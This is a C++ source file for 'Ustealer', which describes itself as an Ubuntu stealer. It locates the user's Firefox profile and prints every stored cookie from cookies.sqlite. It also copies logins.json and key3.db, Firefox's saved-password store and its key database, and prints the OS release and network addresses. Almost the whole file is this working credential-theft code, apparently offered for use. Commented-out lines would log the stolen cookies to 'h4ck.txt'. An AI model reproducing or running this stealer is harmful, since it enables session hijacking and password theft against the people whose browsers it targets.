/*
 ____ ___         __                .__                
|    |   \_______/  |_  ____ _____  |  |   ___________ 
|    |   /  ___/\   __\/ __ \\__  \ |  | _/ __ \_  __ \
|    |  /\___ \  |  | \  ___/ / __ \|  |_\  ___/|  | \/
|______//____  > |__|  \___  >____  /____/\___  >__|   
 @atmon3r    \/   2017     \/     \/          \/       
             
*/
#include <sqlite3.h>
#include <stdio.h>
#include <stdlib.h>
// Read file 
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/ini_parser.hpp>
#include <iostream>
#include <fstream>
//Interface web
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>
 
using namespace std;
 

int callback(void *, int, char **, char **);
int printMoz();
int getNetworkInfo();
bool copyFile();
int printInfo();
string getPathMoz();

int main(int argc, char* argv[]) {

    if (argc < 2) {
		std::cerr << "\n***************************************************************"
				  << "\n** 888     888        888      @atmon3r     888                "
				  << "\n** 888     888        888        2017       888                "
				  << "\n** 888     888        888                   888                "
				  << "\n** 888     888.d8888b 888888 .d88b.  8888b. 888 .d88b. 888d888 "
				  << "\n** 888     88888K     888   d8P  Y8b    '88b888d8P  Y8b888P'   "
				  << "\n** 888     888'Y8888b.888   88888888.d88888888888888888888     "
				  << "\n** Y88b. .d88P     X88Y88b. Y8b.    888  888888Y8b.    888     "
				  << "\n**  'Y88888P'  88888P' 'Y888 'Y8888 'Y888888888 'Y8888 888     "
				  << "\n***************************************************************"
				  << "\n Ustealer (or Ubuntu stealer) is a program that is used only  " 
				  << "\n locallyand it allows to recover various information "
				  << "\n of the session ubuntu. " 
				  << "\n***************************************************************"
				  << "\nUsage: " << argv[0] << " -<action> -<option>\n"
		          << "Actions:\n"
		          << "\t-print\t\tPrint all cookies only mozilla\n"
		          << "\t-dump\t\tDump all data of options\n"
		          << "Options:\n"
		          << "\t-all\t\tPrint all nice informations\n"
		          << "\t-mozilla\tDump all cookies mozilla\n"
		          << "\t-mozilla-pw\tDump mozilla user:password (logins.json & key3.db)\n"
		          << "Exemples:\n"
		          <<  argv[0] << " -print -all\n"
		          <<  argv[0] << " -print -mozilla\n"		          
		          <<  argv[0] << " -dump -mozilla\n"
		          <<  argv[0] << " -dump -mozilla-pw\n"
		          << std::endl;
 
        return 1;
    }
    if (std::string(argv[1]) == "-print") {  
		if (std::string(argv[2]) == "-all") {
			printInfo();
			getNetworkInfo(); 
		} else if(std::string(argv[2]) == "-mozilla" ) {
			printMoz(); 
		} else
    		std::cout << "Bad Option or missing!! " << std::endl;   	
    }
    if (std::string(argv[1]) == "-dump") {  
		if (std::string(argv[2]) == "-mozilla") {
			printInfo();
			getNetworkInfo(); 
		} else if(std::string(argv[2]) == "-mozilla-pw" ) {
			copyFile();
		} else
    		std::cout << "Bad Option or missing!! " << std::endl;   	
    }
    return 0;
}

// Get info network interface 
int getNetworkInfo()
{
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;
    char *addr;

    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family==AF_INET) {
            sa = (struct sockaddr_in *) ifa->ifa_addr;
            addr = inet_ntoa(sa->sin_addr);
            printf("Interface: %s\n\tAddress: %s\n", ifa->ifa_name, addr);
        }
    }
    cout << "\n";
    freeifaddrs(ifap);
    return 0;
}

// copy in binary mode
bool copyFile() {
	string pathMoz = getPathMoz();
	char loginJson [200]; 
	char keyDb [200]; 
	
	// printf("%s",pathMoz.c_str());
	// logins.json
	sprintf(loginJson, "%s/logins.json", pathMoz.c_str());
    std::ifstream src(loginJson, std::ios::binary);
    std::ofstream dest("logins.json", std::ios::binary);
    dest << src.rdbuf();
	// key3.db
	sprintf(keyDb, "%s/key3.db", pathMoz.c_str());
    std::ifstream srcKey3(keyDb, std::ios::binary);
    std::ofstream destKey3("key3.db", std::ios::binary);
    destKey3 << srcKey3.rdbuf();
    return src && dest;
}

// Print linux info
int printInfo() {
	  string line;
	  ifstream myfile ("/etc/lsb-release"); 
	  if (myfile.is_open())
	  {
		cout << "\n";
		cout << "******** /etc/lsb-release *********" << '\n';
		cout << "** \n";
		while ( getline (myfile,line) )
		{
		  cout << "** " << line << '\n';
		}
		cout << "** \n";
		cout << "\n";
		cout << "******** Network Info *********" << '\n';    
		myfile.close();
	  }

	  else cout << "Unable to open file";
    return 0;
}

int printMoz() {
    
    sqlite3 *db;
    char *err_msg = 0;
    char *user_name = getenv("USER");
  	char profilCook [200];
  	char profilPath [200]; 
 
 	// Check config of firefox 
  	sprintf(profilPath, "/home/%s/.mozilla/firefox/profiles.ini", user_name);
	boost::property_tree::ptree pt;
	boost::property_tree::ini_parser::read_ini(profilPath, pt);
	std::string Profile = pt.get<std::string>("Profile0.Path");
 
 	// Build path of cookie
	sprintf(profilCook, "/home/%s/.mozilla/firefox/%s/cookies.sqlite", user_name,Profile.data());
  
    int rc = sqlite3_open(profilCook, &db);    
    if (rc != SQLITE_OK) {        
        fprintf(stderr, "Cannot open database: %s\n", 
                sqlite3_errmsg(db));
        sqlite3_close(db);        
        return 1;
    }
    
    const char *sql = "SELECT * FROM moz_cookies";        
    rc = sqlite3_exec(db, sql, callback, 0, &err_msg);
    
    if (rc != SQLITE_OK ) {        
        fprintf(stderr, "Failed to select data\n");
        fprintf(stderr, "SQL error: %s\n", err_msg);
        sqlite3_free(err_msg);
        sqlite3_close(db);        
        return 1;
    } 
    
    sqlite3_close(db);    
    return 0;
}
string getPathMoz()
{
    char *user_name = getenv("USER");
  	char profilCook [200];
  	char profilPath [200]; 
 
 	// Check config of firefox 
  	sprintf(profilPath, "/home/%s/.mozilla/firefox/profiles.ini", user_name);
	boost::property_tree::ptree pt;
	boost::property_tree::ini_parser::read_ini(profilPath, pt);
	std::string Profile = pt.get<std::string>("Profile0.Path");
 
 	// Build path of cookie
	sprintf(profilCook, "/home/%s/.mozilla/firefox/%s", user_name,Profile.data());
	
    string mystring(profilCook);
    return mystring;
}

int callback(void *NotUsed, int argc, char **argv, 
                    char **azColName) {
 
	// ofstream fout; 
	// fout.open("h4ck.txt",  std::ios::out | std::ios::app); 
    
    NotUsed = 0;    
    for (int i = 0; i < argc; i++) {
        printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL"); // See output 
        // fout <<  azColName[i] << " = " << argv[i] << endl; // don't need to cast int to int
 		
    }    
    // fout << "\n" << endl;
    // fout.close(); 
    printf("\n"); // See output 
    return 0;
}
